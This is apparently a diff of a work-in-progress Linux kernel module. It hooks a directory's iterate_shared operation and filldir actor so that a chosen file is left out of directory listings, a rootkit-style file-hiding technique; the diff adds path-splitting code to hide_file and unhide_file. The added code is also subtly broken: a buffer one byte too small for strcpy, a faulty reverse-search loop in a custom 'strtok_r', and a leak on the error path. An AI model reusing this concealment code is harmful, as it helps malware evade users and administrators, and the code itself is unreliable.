@@ -14,7 +14,7 @@ MODULE_VERSION("0.1.0");
 static struct list_head *modules;
 
 // TODO: Provide a way for the module to control the path(s).
-static const char *test_path_name = "/home/yanayg";
+static char *test_path_name = "/home/yanayg/test_file";
 static const char *test_file_name = "test_file";
 //static int (*iterate_shared) (struct file *, struct dir_context *);
 
@@ -103,20 +103,20 @@ static struct fops_hook *get_fops_hook(const struct inode *inode) {
 	return NULL;
 }
 
-struct dir_context_hook {
+struct hooked_dir_context {
     struct list_head head;
     struct dir_context *ctx;
     filldir_t prev_actor;
 };
 
-static LIST_HEAD(dir_context_hooks);
+static LIST_HEAD(hooked_dir_context_list);
 
 static int new_actor(struct dir_context *ctx, const char *name, int namelen, loff_t off, u64 ino, unsigned type) {
     struct list_head *pos;
-    struct dir_context_hook *entry;
+    struct hooked_dir_context *entry;
 
-	list_for_each(pos, &dir_context_hooks) {
-	    entry = list_entry(pos, struct dir_context_hook, head);
+	list_for_each(pos, &hooked_dir_context_list) {
+	    entry = list_entry(pos, struct hooked_dir_context, head);
 	    if (entry->ctx == ctx) {
 	    	printk(KERN_INFO "Called hooked actor! %s", name);
 	    	if (!strcmp(name, test_file_name)) {
@@ -130,13 +130,13 @@ static int new_actor(struct dir_context *ctx, const char *name, int namelen, lof
 
 static int new_iterate_shared(struct file *filp, struct dir_context *dir_context) {
     int res;
-    struct dir_context_hook *hook;
+    struct hooked_dir_context *hook;
     struct fops_hook *fops_hook;
 	printk(KERN_INFO "Called hooked iterate!");
-	hook = (struct dir_context_hook *)kmalloc(sizeof(struct dir_context_hook), GFP_KERNEL);
+	hook = (struct hooked_dir_context *)kmalloc(sizeof(struct hooked_dir_context), GFP_KERNEL);
 	hook->ctx = dir_context;
 	hook->prev_actor = dir_context->actor;
-	list_add(&hook->head, &dir_context_hooks);
+	list_add(&hook->head, &hooked_dir_context_list);
 	dir_context->actor = new_actor;
 	fops_hook = get_fops_hook(filp->f_inode);
 	if (fops_hook == NULL) return -1;
@@ -147,32 +147,57 @@ static int new_iterate_shared(struct file *filp, struct dir_context *dir_context
     return 0;
 }
 
-static int split_filename()
+static char *strtok_r(char *str, const char *delim) {
+    int i = strlen(str) - 1;
+    while (str[i] != '\0') {
+        if (!memcmp(str + i, delim, sizeof(char) * strlen(delim))) {
+            str[i] = '\0';
+            return str + i + strlen(delim);
+        }
+        i--;
+    }
+    return NULL;
+}
 
 static int hide_file(const char *path_name) {
     int retval;
+	char *dir_path;
+	char *file_name;
 	struct inode *inode;
 	struct file_operations *file_operations;
 
-	if ((retval = get_inode_by_path_name(path_name, &inode))) {
+	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
+	strcpy(dir_path, path_name);
+    file_name = strtok_r(dir_path, "/");
+
+	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
 	    return retval;
 	}
+	kfree(dir_path);
 
 	if ((retval = create_fops_hook(inode, &file_operations))) {
 	    return retval;
 	}
 
 	file_operations->iterate_shared = new_iterate_shared;
+
 	return 0;
 }
 
 static int unhide_file(const char *path_name) {
     int retval;
+	char *dir_path;
+	char *file_name;
 	struct inode *inode;
 
-	if ((retval = get_inode_by_path_name(path_name, &inode))) {
+	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
+	strcpy(dir_path, path_name);
+    file_name = strtok_r(dir_path, "/");
+
+	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
 	    return retval;
 	}
+    kfree(dir_path);
 
 	return free_fops_hook(inode);
 }
